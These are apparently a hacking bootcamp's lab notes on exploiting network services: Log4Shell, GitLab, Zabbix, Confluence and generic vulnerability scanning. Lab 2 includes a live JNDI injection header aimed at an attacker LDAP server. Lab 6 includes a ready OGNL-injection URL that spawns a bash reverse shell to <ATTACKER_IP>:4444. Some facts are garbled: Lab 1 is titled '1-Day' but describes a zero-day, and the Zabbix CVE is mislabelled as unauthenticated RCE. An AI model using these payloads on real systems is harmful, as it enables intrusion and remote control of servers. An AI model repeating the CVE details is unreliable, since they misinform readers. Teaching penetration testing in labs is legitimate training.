# Network Service Exploitation - Day 3

## Overview
This document outlines the labs completed on 08/01/2025 during the hacking bootcamp, focusing on exploiting vulnerabilities in network services.

## Table of Contents
- [Lab 1: Network Service 1-Day Exploit](#lab-1-network-service-1-day-exploit)
- [Lab 2: Apache Log4j Attack](#lab-2-apache-log4j-attack)
- [Lab 3: Gitlab Attack](#lab-3-gitlab-attack)
- [Lab 4: RCE as Service in Zabbix Example](#lab-4-rce-as-service-in-zabbix-example)
- [Lab 5: Searching for Known Software Vulnerabilities](#lab-5-searching-for-known-software-vulnerabilities)
- [Lab 6: Confluence Attack](#lab-6-confluence-attack)

## Labs

### Lab 1: Network Service 1-Day Exploit
#### Objective
Gain unauthorized access by exploiting a zero-day vulnerability in a network service.

#### Vulnerabilities
- Zero-Day Vulnerability: Unpatched flaw in a network service allows remote code execution.

#### Requirements
Target network service must be running a vulnerable version exposed to the network.

#### Steps
1. **Setup**
   - Verify connectivity to the target service.
   ```bash
   nmap -sV -p <SERVICE_PORT> <TARGET_IP>
   ```
2. **Reconnaissance**
   - Identify the service and version.
   ```bash
   nmap --script vuln -p <SERVICE_PORT> <TARGET_IP>
   ```
3. **Exploitation**
   - Execute a zero-day exploit (e.g., custom PoC).
   ```bash
   python3 zeroday_exploit.py --host <TARGET_IP> --port <SERVICE_PORT>
   ```

#### Why It Works
Unpatched zero-day vulnerabilities allow attackers to execute arbitrary code on the target service.

#### Alternatives
- Use Metasploit for automated exploitation if a module exists.

#### Resources
- [Exploit-DB Zero-Days: https://www.exploit-db.com/](https://www.exploit-db.com/)

#### Notes
- Obtain or develop a proof-of-concept (PoC) exploit for the specific service.

---

### Lab 2: Apache Log4j Attack
#### Objective
Achieve remote code execution by exploiting the Apache Log4j vulnerability (Log4Shell).

#### Vulnerabilities
- Log4Shell (CVE-2021-44228): Unsanitized JNDI lookups in Log4j allow remote code execution.

#### Requirements
Target server must run a vulnerable version of Apache Log4j (2.0–2.14.1).

#### Steps
1. **Setup**
   - Verify connectivity to the target application.
   ```bash
   curl http://<TARGET_IP>:<PORT>
   ```
2. **Reconnaissance**
   - Confirm Log4j vulnerability with a JNDI payload test.
   ```bash
   curl -H "X-Api-Version: ${jndi:ldap://<ATTACKER_IP>:1389/a}" http://<TARGET_IP>:<PORT>
   ```
3. **Exploitation**
   - Exploit Log4Shell to execute a reverse shell.
   ```bash
   python3 log4shell_exploit.py --host <TARGET_IP> --port <PORT> --ldap <ATTACKER_IP>:1389
   ```

#### Why It Works
Log4j’s JNDI lookup feature processes malicious input, allowing attackers to execute arbitrary code via LDAP or RMI.

#### Alternatives
- Use Metasploit’s Log4Shell module for automated exploitation.

#### Resources
- [CVE-2021-44228 Details: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
- [Log4Shell Guide: https://www.lunasec.io/docs/log4shell/](https://www.lunasec.io/docs/log4shell/)

#### Notes
- Set up an LDAP server on the attacker machine to deliver the payload.

---

### Lab 3: Gitlab Attack
#### Objective
Gain unauthorized access by exploiting a vulnerability in Gitlab.

#### Vulnerabilities
- Gitlab RCE (e.g., CVE-2021-22205): Unauthenticated remote code execution via ExifTool.

#### Requirements
Target Gitlab instance must be running a vulnerable version (13.0–13.10.2).

#### Steps
1. **Setup**
   - Verify connectivity to the Gitlab instance.
   ```bash
   curl http://<TARGET_IP>/users/sign_in
   ```
2. **Reconnaissance**
   - Identify the Gitlab version.
   ```bash
   curl http://<TARGET_IP>/help | grep -i version
   ```
3. **Exploitation**
   - Exploit CVE-2021-22205 to upload a malicious image for RCE.
   ```bash
   python3 gitlab_rce.py --url http://<TARGET_IP> --payload reverse_shell
   ```

#### Why It Works
Vulnerable Gitlab versions process malicious image metadata, allowing remote code execution via ExifTool.

#### Alternatives
- Use Metasploit’s Gitlab RCE module for automated exploitation.

#### Resources
- [CVE-2021-22205 Details: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205)
- [Gitlab RCE Guide: https://www.hacktricks.xyz/pentesting/pentesting-web/gitlab](https://www.hacktricks.xyz/pentesting/pentesting-web/gitlab)

#### Notes
- Ensure a listener is active for the reverse shell payload.

---

### Lab 4: RCE as Service in Zabbix Example
#### Objective
Achieve remote code execution by exploiting a vulnerability in Zabbix.

#### Vulnerabilities
- Zabbix RCE (e.g., CVE-2020-15803): Script execution allows unauthenticated RCE.

#### Requirements
Target Zabbix server must be running a vulnerable version with exposed services.

#### Steps
1. **Setup**
   - Verify connectivity to the Zabbix server.
   ```bash
   nmap -sV -p 80,443 <TARGET_IP>
   ```
2. **Reconnaissance**
   - Confirm Zabbix version and exposed endpoints.
   ```bash
   curl http://<TARGET_IP>/zabbix/index.php
   ```
3. **Exploitation**
   - Exploit CVE-2020-15803 to execute a script for RCE.
   ```bash
   python3 zabbix_rce.py --url http://<TARGET_IP>/zabbix --script reverse_shell
   ```

#### Why It Works
Zabbix’s script execution feature in vulnerable versions allows attackers to run arbitrary code without authentication.

#### Alternatives
- Use Metasploit’s Zabbix module for automated exploitation.

#### Resources
- [CVE-2020-15803 Details: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15803](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15803)
- [Zabbix Exploitation Guide: https://www.hacktricks.xyz/pentesting/pentesting-web/zabbix](https://www.hacktricks.xyz/pentesting/pentesting-web/zabbix)

#### Notes
- Verify Zabbix version before attempting exploitation.

---

### Lab 5: Searching for Known Software Vulnerabilities
#### Objective
Identify exploitable vulnerabilities in network services using enumeration tools.

#### Vulnerabilities
- Known Vulnerabilities: Outdated software versions with documented exploits.

#### Requirements
Target network service must be accessible for scanning.

#### Steps
1. **Setup**
   - Verify connectivity to the target service.
   ```bash
   ping <TARGET_IP>
   ```
2. **Reconnaissance**
   - Scan for services and vulnerabilities using Nmap.
   ```bash
   nmap --script vuln -p- <TARGET_IP>
   ```
3. **Exploitation**
   - Search for exploits matching discovered vulnerabilities.
   ```bash
   searchsploit <SERVICE_NAME> <VERSION>
   ```

#### Why It Works
Outdated services have known vulnerabilities that can be identified and exploited using public exploit databases.

#### Alternatives
- Use Nessus or OpenVAS for automated vulnerability scanning.

#### Resources
- [Nmap Vulnerability Scripts: https://nmap.org/nsedoc/categories/vuln.html](https://nmap.org/nsedoc/categories/vuln.html)
- [Exploit-DB: https://www.exploit-db.com/](https://www.exploit-db.com/)

#### Notes
- Cross-reference Nmap findings with Exploit-DB for accurate exploits.

---

### Lab 6: Confluence Attack
#### Objective
Gain unauthorized access by exploiting a vulnerability in Confluence.

#### Vulnerabilities
- Confluence RCE (e.g., CVE-2022-26134): Unauthenticated remote code execution via OGNL injection.

#### Requirements
Target Confluence server must be running a vulnerable version (7.0.0–7.19.7).

#### Steps
1. **Setup**
   - Verify connectivity to the Confluence server.
   ```bash
   curl http://<TARGET_IP>/confluence
   ```
2. **Reconnaissance**
   - Identify the Confluence version.
   ```bash
   curl http://<TARGET_IP>/confluence/login.action | grep -i version
   ```
3. **Exploitation**
   - Exploit CVE-2022-26134 to execute a reverse shell.
   ```bash
   curl "http://<TARGET_IP>/confluence/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/4444%200%3E%261%27%22%29%7D/"
   ```

#### Why It Works
Confluence’s OGNL injection vulnerability allows unauthenticated attackers to execute arbitrary code via crafted URLs.

#### Alternatives
- Use Metasploit’s Confluence RCE module for automated exploitation.

#### Resources
- [CVE-2022-26134 Details: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134)
- [Confluence Exploitation Guide: https://www.hacktricks.xyz/pentesting/pentesting-web/confluence](https://www.hacktricks.xyz/pentesting/pentesting-web/confluence)

#### Notes
- Set up a listener (e.g., netcat) on `<ATTACKER_IP>:4444` before exploitation.

---